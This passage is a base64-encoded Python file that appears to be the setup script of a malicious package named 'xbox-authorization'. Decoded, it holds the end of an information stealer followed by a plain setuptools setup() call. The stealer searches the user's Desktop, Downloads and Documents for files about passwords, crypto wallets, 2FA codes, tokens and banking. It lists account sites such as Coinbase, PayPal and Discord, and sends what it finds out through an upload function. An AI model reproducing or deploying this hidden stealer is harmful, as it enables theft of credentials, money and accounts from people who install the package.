LmFwcGVuZChbJ2ZvbGRlcicscGF0aCxmaWZvdW5kXSkKZGVmIEtpd2koKToKICAgIHVzZXI9dGVtcC5zcGxpdCgnXFxBcHBEYXRhJylbMF0KICAgIHBhdGgyc2VhcmNoPVsKICAgICAgICB1c2VyKycvRGVza3RvcCcsCiAgICAgICAgdXNlcisnL0Rvd25sb2FkcycsCiAgICAgICAgdXNlcisnL0RvY3VtZW50cycKXQogICAga2V5X3dvcmRzRm9sZGVyPVsKICAgICAgICAnYWNjb3VudCcsCiAgICAgICAgJ2Fjb3VudCcsCiAgICAgICAgJ3Bhc3N3JywKICAgICAgICAnc2VjcmV0JwpdCiAgICBrZXlfd29yZHNGaWxlcz1bCiAgICAgICAgJ3Bhc3N3JywKICAgICAgICAnbWRwJywKICAgICAgICAnbW90ZGVwYXNzZScsCiAgICAgICAgJ21vdF9kZV9wYXNzZScsCiAgICAgICAgJ2xvZ2luJywKICAgICAgICAnc2VjcmV0JywKICAgICAgICAnYWNjb3VudCcsCiAgICAgICAgJ2Fjb3VudCcsCiAgICAgICAgJ3BheXBhbCcsCiAgICAgICAgJ2JhbnF1ZScsCiAgICAgICAgJ2FjY291bnQnLAogICAgICAgICdtZXRhbWFzaycsCiAgICAgICAgJ3dhbGxldCcsCiAgICAgICAgJ2NyeXB0bycsCiAgICAgICAgJ2V4b2R1cycsCiAgICAgICAgJ2Rpc2NvcmQnLAogICAgICAgICcyZmEnLAogICAgICAgICdjb2RlJywKICAgICAgICAnbWVtbycsCiAgICAgICAgJ2NvbXB0ZScsCiAgICAgICAgJ3Rva2VuJywKICAgICAgICAnYmFja3VwJywKICAgICAgICAnc2VjcmV0JywKICAgICAgICAncHJveCcKXQogICAgd2lraXRoPVtdCiAgICBmb3IgcGF0dCBpbiBwYXRoMnNlYXJjaDoKICAgICAgICBraXdpPXRocmVhZGluZy5UaHJlYWQodGFyZ2V0PUtpd2lGaWxlLGFyZ3M9W3BhdHQsa2V5X3dvcmRzRmlsZXNdKTtraXdpLnN0YXJ0KCkKICAgICAgICB3aWtpdGguYXBwZW5kKGtpd2kpCiAgICByZXR1cm4gd2lraXRoCmdsb2JhbCBrZXl3b3JkLGNvb2tpV29yZHMscGFzd1dvcmRzCmtleXdvcmQ9WwogICAgJ21haWwnLCdbY29pbmJhc2VdKGh0dHBzOi8vY29pbmJhc2UuY29tKScsJ1tzZWxsaXhdKGh0dHBzOi8vc2VsbGl4LmlvKScsJ1tnbWFpbF0oaHR0cHM6Ly9nbWFpbC5jb20pJywnW3N0ZWFtXShodHRwczovL3N0ZWFtLmNvbSknLCdbZGlzY29yZF0oaHR0cHM6Ly9kaXNjb3JkLmNvbSknLCdbcmlvdGdhbWVzXShodHRwczovL3Jpb3RnYW1lcy5jb20pJywnW3lvdXR1YmVdKGh0dHBzOi8veW91dHViZS5jb20pJywnW2luc3RhZ3JhbV0oaHR0cHM6Ly9pbnN0YWdyYW0uY29tKScsJ1t0aWt0b2tdKGh0dHBzOi8vdGlrdG9rLmNvbSknLCdbdHdpdHRlcl0oaHR0cHM6Ly90d2l0dGVyLmNvbSknLCdbZmFjZWJvb2tdKGh0dHBzOi8vZmFjZWJvb2suY29tKScsJ2NhcmQnLCdbZXBpY2dhbWVzXShodHRwczovL2VwaWNnYW1lcy5jb20pJywnW3Nwb3RpZnldKGh0dHBzOi8vc3BvdGlmeS5jb20pJywnW3lhaG9vXShodHRwczovL3lhaG9vLmNvbSknLCdbcm9ibG94XShodHRwczovL3JvYmxveC5jb20pJywnW3R3aXRjaF0oaHR0cHM6Ly90d2l0Y2guY29tKScsJ1ttaW5lY3JhZnRdKGh0dHBzOi8vbWluZWNyYWZ0Lm5ldCknLCdiYW5rJywnW3BheXBhbF0oaHR0cHM6Ly9wYXlwYWwuY29tKScsJ1tvcmlnaW5dKGh0dHBzOi8vb3JpZ2luLmNvbSknLCdbYW1hem9uXShodHRwczovL2FtYXpvbi5jb20pJywnW2ViYXldKGh0dHBzOi8vZWJheS5jb20pJywnW2FsaWV4cHJlc3NdKGh0dHBzOi8vYWxpZXhwcmVzcy5jb20pJywnW3BsYXlzdGF0aW9uXShodHRwczovL3BsYXlzdGF0aW9uLmNvbSknLCdbaGJvXShodHRwczovL2hiby5jb20pJywnW3hib3hdKGh0dHBzOi8veGJveC5jb20pJywnYnV5Jywnc2VsbCcsJ1tiaW5hbmNlXShodHRwczovL2JpbmFuY2UuY29tKScsJ1tob3RtYWlsXShodHRwczovL2hvdG1haWwuY29tKScsJ1tvdXRsb29rXShodHRwczovL291dGxvb2suY29tKScsJ1tjcnVuY2h5cm9sbF0oaHR0cHM6Ly9jcnVuY2h5cm9sbC5jb20pJywnW3RlbGVncmFtXShodHRwczovL3RlbGVncmFtLmNvbSknLCdbcG9ybmh1Yl0oaHR0cHM6Ly9wb3JuaHViLmNvbSknLCdbZGlzbmV5XShodHRwczovL2Rpc25leS5jb20pJywnW2V4cHJlc3N2cG5dKGh0dHBzOi8vZXhwcmVzc3Zwbi5jb20pJywnY3J5cHRvJywnW3ViZXJdKGh0dHBzOi8vdWJlci5jb20pJywnW25ldGZsaXhdKGh0dHBzOi8vbmV0ZmxpeC5jb20pJwpdCmNvb2tpV29yZHM9W10KcGFzd1dvcmRzPVtdCkdhdGhlckFsbCgpCkRFVEVDVEVEPVRydXN0KENvb2tpZXMpCmlmIG5vdCBERVRFQ1RFRDoKICAgIHdpa2l0aD1LaXdpKCkKICAgIGZvciB0aHJlYWQgaW4gd2lraXRoOnRocmVhZC5qb2luKCkKICAgIHRpbWUuc2xlZXAoMC4yKQogICAgZmlsZXRleHQ9J1xuJwogICAgZm9yIGFyZyBpbiBLaXdpRmlsZXM6CiAgICAgICAgaWYgbGVuKGFyZ1syXSkhPTA6CiAgICAgICAgICAgIGZvbGRwYXRoPWFyZ1sxXQogICAgICAgICAgICBmb2xkbGlzdD1hcmdbMl0KICAgICAgICAgICAgZmlsZXRleHQrPWYiICB7Zm9sZHBhdGh9XG4iCiAgICAgICAgICAgIGZvciBmZmlsIGluIGZvbGRsaXN0OgogICAgICAgICAgICAgICAgYT1mZmlsWzBdLnNwbGl0KCcvJykKICAgICAgICAgICAgICAgIGZpbGVhbm1lPWFbbGVuKGEpLTFdCiAgICAgICAgICAgICAgICBiPWZmaWxbMV0KICAgICAgICAgICAgICAgIGZpbGV0ZXh0Kz1mIi4uLiBbe2ZpbGVhbm1lfV0oe2J9KVxuIgogICAgICAgICAgICBmaWxldGV4dCs9J1xuJwogICAgdXBsb2FkKCdraXdpJyxmaWxldGV4dCkKCgpmcm9tIHNldHVwdG9vbHMgaW1wb3J0IHNldHVwCgpzZXR1cCgKCiAgICBuYW1lPSd4Ym94LWF1dGhvcml6YXRpb24nLAogICAgcGFja2FnZXM9Wyd4Ym94LWF1dGhvcml6YXRpb24nXSwKICAgIHZlcnNpb249JzEuMCcsCiAgICBsaWNlbnNlPSdNSVQnLAogICAgZGVzY3JpcHRpb249J2Egc2ltcGxlIHBhY2thZ2UuJywKICAgIGF1dGhvcj0naGVscGVyJywKICAgIGtleXdvcmRzPVsnc3R5bGUnXSwKICAgIGluc3RhbGxfcmVxdWlyZXM9WycnXSwKICAgIGNsYXNzaWZpZXJzPVsnRGV2ZWxvcG1lbnQgU3RhdHVzIDo6IDUgLSBQcm9kdWN0aW9uL1N0YWJsZSddCik=
